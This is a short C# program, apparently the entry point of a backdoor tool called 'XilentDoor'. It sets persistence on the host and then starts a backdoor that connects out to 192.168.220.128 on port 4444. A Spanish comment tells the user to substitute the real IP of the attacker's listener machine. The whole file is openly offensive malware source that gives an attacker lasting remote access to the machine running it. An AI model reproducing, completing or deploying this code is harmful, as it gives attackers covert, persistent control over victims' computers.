using XilentDoor.Core;

namespace XilentDoor
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Establecer persistencia
            Persistence.SetPersistence();

            Backdoor bd = new Backdoor();
            bd.Start("192.168.220.128", 4444); // Reemplazar con la IP real del Listener (máquina atacante)
        }
    }
}
